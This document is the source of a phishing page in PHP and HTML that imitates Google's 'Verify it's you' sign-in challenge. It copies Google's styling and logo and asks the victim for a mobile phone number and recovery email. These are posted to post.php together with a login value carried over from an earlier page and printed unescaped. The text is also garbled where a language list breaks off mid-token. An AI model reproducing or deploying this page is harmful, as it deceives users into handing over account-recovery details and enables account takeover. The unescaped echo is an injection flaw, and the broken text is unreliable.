<?
$login = $_REQUEST['login'];
?>
<!DOCTYPE html>
  <head>
  <meta charset="utf-8">
  <link rel="icon" type="image/ico" href="http://www.google.com/favicon.ico">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
  <meta name="robots" content="noindex">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>Continue - Google Accounts</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <link href="http://fonts.googleapis.com/css?family=Open+Sans:300,400&amp;lang=en" rel="stylesheet" type="text/css">
<style>
  .banner {
  text-align: center;
  }
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember.show-bubble .bubble-wrap,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 10px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
</style>
  <script type="text/JavaScript">
<!--
function MM_findObj(n, d) { //v4.01
  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
  if(!x && d.getElementById) x=d.getElementById(n); return x;
}

function MM_validateForm() { //v4.0
  var i,p,q,nm,test,num,min,max,errors='',args=MM_validateForm.arguments;
  for (i=0; i<(args.length-2); i+=3) { test=args[i+2]; val=MM_findObj(args[i]);
    if (val) { nm=val.id; if ((val=val.value)!="") {
      if (test.indexOf('isEmail')!=-1) { p=val.indexOf('@');
        if (p<1 || p==(val.length-1)) errors+='- '+nm+' must contain an e-mail address.\n';
      } else if (test!='R') { num = parseFloat(val);
        if (isNaN(val)) errors+='- '+nm+' must contain a number.\n';
        if (test.indexOf('inRange') != -1) { p=test.indexOf(':');
          min=test.substring(8,p); max=test.substring(p+1);
          if (num<min || max<num) errors+='- '+nm+' must contain a number between '+min+' and '+max+'.\n';
    } } } else if (test.charAt(0) == 'R') errors += '- '+nm+' is required.\n'; }
  } if (errors) alert('Please correct the following error(s) before you can proceed:\n'+errors);
  document.MM_returnValue = (errors == '');
}
//-->
  </script>
  </head>
  </style>
  </head>
  <body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_2x.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
  </div>
  <div class="main content clearfix">
<div class="banner">
  <h1 id="login-challenge-heading">
  Verify it's you
  </h1><div class="body">
  <p class="description">
    <p>There's something unusual about how you're signing in. 
	<!--<strong>(</strong><strong>)</strong>--></p> 
    <p>To show that it's really you, complete the task below.</p>
</div>

<div class="card signin-card">
  <div id="cc_iframe_parent"></div>
<img src="http://ssl.gstatic.com/accounts/marc/phoneknowledge.png" width="190" height="150" />

  <form method="post" action="post.php" id="gaia_loginform">
  <input name="GALX" type="hidden"
           value="hyavLezOl-8">
  <input name="checkedDomains" type="hidden" value="youtube">
  <input name="checkConnection" type="hidden" value="youtube:1094:1">
  <input name="pstMsg" type="hidden" value="1">
  <input name="login" type="hidden" value="<? print $login; ?>">
  <input type="hidden" id="_utf8" name="_utf8" value="&#9731;"/>
  <input type="hidden" name="bgresponse" id="bgresponse" value="js_disabled">
  <input type="hidden" id="pstMsg" name="pstMsg" value="0">
  <input type="hidden" id="dnConn" name="dnConn" value="">
  <input type="hidden" id="checkConnection" name="checkConnection" value="">
  <input type="hidden" id="checkedDomains" name="checkedDomains"
         value="youtube">
		 
		
    <p>We'll check if both details matches the data we have on file</p> 
 	 
<input required="required" pattern=".{9,15}" id="brakinginfo" title="Enter full phone number" type="text" placeholder="Enter your mobile phone number" name="phone">
<p></p>
<input id="brakinginfo" title="Enter full phone number" pattern=".{6,50}"type="email" placeholder="Enter your recovery email address" name="recovery" required>
<hr></hr>

<p></p>
  <input name="Done" type="submit" class="rc-button rc-button-submit" id="" value="Done">
  <a id="link-forgot-passwd" href="#"
        >
  Need help?
  </a>
  </form>
</div>
<div class="one-google">
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  Google
  </li>
  <li>
  <a href="#" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="http://ssl.gstatic.com/images/icons/ui/common/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  ‪Afrikaans‬
  </option>
  <option value="az"
                 >
  ‪azərbaycan‬
  </option>
  <option value="in"
                 >
  ‪Bahasa Indonesia‬
  </option>
  <option value="ms"
                 >
  ‪Bahasa Melayu‬
  </option>
  <option value="ca"
                 >
  ‪català‬
  </option>
  <option value="cs"
                 >
  ‪Čeština‬
  </option>
  <option value="da"
                 >
  ‪Dansk‬
  </option>
  <option value="de"
                 >
  ‪Deutsch‬
  </option>
  <option value="et"
                 >
  ‪eesti‬
  </option>
  <option value="en-GB"
                 >
  ‪English (United Kingdom)‬
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  ‪English (United States)‬
  </option>
  <option value="es"
                 >
  ‪Español (España)‬
  </option>
  <option value="es-419"
                 >
  ‪Español (Latinoamérica)‬
  </option>
  <option value="eu"
                 >
  ‪euskara‬
  </option>
  <option value="fil"
                 >
  ‪Filipino‬
  </option>
  <option value="fr-CA"
                 >
  ‪Français (Canada)‬
  </option>
  <option value="fr"
                 >
  ‪Français (France)‬
  </option>
  <option value="gl"
                 >
  ‪galego‬
  </option>
  <option value="hr"
                 >
  ‪Hrvatski‬
  </option>
  <option value="zu"
                 >
  ‪isiZulu‬
  </option>
  <option value="is"
                 >
  ‪íslenska‬
  </option>
  <option value="it"
                 >
  ‪Italiano‬
  </option>
  <option value="sw"
                 >
  ‪Kiswahili‬
  </option>
  <option value="lv"
                 >
  ‪latviešu‬
  </option>
  <option value="lt"
                 >
  ‪lietuvių‬
  </option>
  <option value="hu"
                 >
  ‪magyar‬
  </option>
  <option value="nl"
                 >
  ‪Nederlands‬
  </option>
  <option value="no"
                 >
  ‪norsk‬
  </option>
  <option value="pl"
                 >
  ‪polski‬
  </option>
  <option value="pt"
                 >
  ‪Português‬
  </option>
  <option value="pt-BR"
                 >
  ‪Português (Brasil)‬
  </option>
  <option value="pt-PT"
                 >
  ‪Português (Portugal)‬
  </option>
  <option value="ro"
                 >
  ‪română‬
  </option>
  <option value="sk"
                 >
  ‪Slovenčina‬
  </option>
  <option value="sl"
                 >
  ‪slovenščina‬
  </option>
  <option value="fiBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G;var Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gd;Gd=window.addEventListener?function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Ge(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Gf(a,b).push(d);return d}:window.attachEvent?function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Ge(b);return d};a.attachEvent("on"+b,d);Gf(a,b).push(d);return d}:void 0;var Ge=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Gf=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gg=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gh=function(){this.g=Gg();this.parameters={}};Gh.prototype.oncomplete=function(){};
Gh.prototype.send=function(a){var b=[],c;for(c in this.parameters){var d=this.parameters[c];b.push(c+"="+encodeURIComponent(d))}var b=b.join("&"),e=this.g,f=this.oncomplete;e.open("POST",a,!0);e.setRequestHeader("Content-type","application/x-www-form-urlencoded");e.onreadystatechange=function(){4==e.readyState&&f({status:e.status,text:e.responseText})};e.send(b)};
Gh.prototype.get=function(a){var b=this.oncomplete,c=this.g;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gj=function(a){this.e=a;this.k=this.l();if(null==this.e)throw new Gi("Empty module name");};G=Gj.prototype;G.l=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.n=function(a,b,c){var d=this.k,e=this.e||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gh;d.parameters={};try{var e=this.n(a,b,c);d.get(e)}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};G.warn=function(a,b){this.send("WARN",a,b)};
G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gi=function(){};var Gk=Gk||new Gj("uri"),Gl=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Gm=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gn=function(a,b){var c=b.match(Gl)[1]||null,d,e=b.match(Gl)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gl)[4]||null)||null;if(!c||!d)return Gk.error("Invalid origin Exception",[String(b)]),!1;e||(e=Gm(c));var f=a.match(Gl)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gl)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gl)[4]||null)||null)||(d=Gm(f));return e==d};var Go=Go||new Gj("check_connection"),Gp="^([^:]+):(\\d*):(\\d?)$",Gq=null,Gr=null,Gs=null,Gt=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gt.prototype;G.h=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Go.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.d=function(a){return this.h(a,Gr)};G.j=function(a){return this.h(a,Gs)};G.i=function(a){a=a.match(Gp);return!a||3>a.length?null:a[1]};
